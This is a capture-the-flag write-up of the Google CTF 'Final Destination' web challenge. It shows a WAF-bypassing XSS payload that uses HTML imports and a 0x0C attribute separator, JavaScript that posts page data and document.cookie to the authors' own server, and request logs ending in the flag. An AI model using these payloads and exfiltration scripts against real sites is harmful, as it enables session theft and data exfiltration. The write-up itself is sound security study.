---
layout: post
title: Google CTF - Final Destination [WEB]
author: lanjelot
tags: [ctf, googlectf, web]
---

 * Competition: Google CTF
 * Challenge Name: Final Destination
 * Type: Web
 * Points: 200 pts
 * URL: https://ctf-final-destination.appspot.com/

<!--more-->


We solved this challenge after the CTF was over. It was only solved by 1 team during the competition and we could not find any writeup so we looked into it a bit more since the webapp was still up.

The Home page looked like this:

![alt](https://i.imgur.com/ZtkJm2i.png)

The `issue` field seemed to be vulnerable to XSS as the app did not encode `[<>=/]` however there was a WAF filtering out most special characters such as `[space"'.]`.

We confirmed it was an XSS challenge by submitting `<iframe/src=//101058054>` with our IP address encoded in decimal, and we got a visit from phantomjs:

```
-- 146.148.94.130 [2016-05-15 11:24:07,099]
GET / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://ctf-final-destination.appspot.com/reportz
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
X-Secret: abcd6e03deb377e106c835ba3545ab08f8f7
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
Host: our.ip
```

Cool, maybe the flag is in the html of /reportz but we get 403 Forbidden when trying to access that page, even when sending that `X-Secret` header and `X-Forwarded-For: 127.0.0.1` (or 146.148.94.130, from which phantomjs outbounds).

Let's try some xhr then. We set up our index.html as follows:

```html
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<script type="text/javascript" charset="utf-8">
$.ajax({
     type: "GET",
     url: 'http://ctf-final-destination.appspot.com/reportz',
     async: false,
     dataType : 'html',
     withCredetials: true, // so that X-Secret and any Cookie or auth header are sent to /reportz
     success: function(data, status, xhr) {
       $.post("http://our.ip/success", btoa(data));
     },
     error: function(jqXHR, textStatus, ex) {
       t = (textStatus + "," + ex + "," + jqXHR.responseText);
       $.post("http://our.ip/error", btoa(t));
     }
});
</script>
```

And submit the `<iframe/src=//101058054>` payload again but unfortunately, we end up in the error function which I think is due to ctf-final-destination.appspot.com not sending any CORS headers.

```
-- 146.148.94.130 [2016-05-15 11:43:05,064]
GET / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://ctf-final-destination.appspot.com/reportz
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
X-Secret: abcd6e03deb377e106c835ba3545ab08f8f7
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
Host: our.ip

-- 146.148.94.130 [2016-05-15 11:43:05,468]
POST /error HTTP/1.1
Accept: */*
Referer: http://101058054/
Origin: http://101058054
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 88
X-Secret: abcd6e03deb377e106c835ba3545ab08f8f7
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
Host: our.ip

ZXJyb3IsRXJyb3I6IE5FVFdPUktfRVJSOiBYTUxIdHRwUmVxdWVzdCBFeGNlcHRpb24gMTAxLHVuZGVmaW5lZA==
```

At this point, {{ site.data.authors.ace.name }} stepped in and found the following two tricks:

 1. Trick #1: we can use 0x0C instead of space to separate html tag attributes as the WAF doesn't filter it out. Thanks to [@cure53](https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-5) for the fine research.
 1. Trick #2: let's try to use [html imports](https://html5sec.org/#138), a feature [supported](http://caniuse.com/#feat=imports) by webkit-based browsers and therefore phantomjs. Also note that the WAF filtered out obvious event handlers such as onerror etc.

OK so we change our index.html to `<script>window.location='http://our.ip/success?'+document.cookie;</script>` to net the cookies (in the other task "geokitties", the flag was in a cookie). Then we configure our web server to send the CORS header `Access-Control-Allow-Origin: *` and submit `issue=%3Clink%0Crel%3Dimport%0Chref%3D%2F%2F101058054%3E`

Helloooo mr. flag:

```
-- 146.148.94.130 [2016-05-15 12:07:20,137]
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Referer: http://ctf-final-destination.appspot.com/reportz
Origin: http://ctf-final-destination.appspot.com
Accept: */*
X-Secret: abcd6e03deb377e106c835ba3545ab08f8f7
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
Host: our.ip

-- 146.148.94.130 [2016-05-15 12:07:20,345]
GET /success?flag=CTF%7BWhich-vegetable-did-Noah-leave-off-the-Ark---Leeks%7D HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://ctf-final-destination.appspot.com/reportz
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
Host: our.ip
```

Thanks to the CTF organizers for the cool challenges.

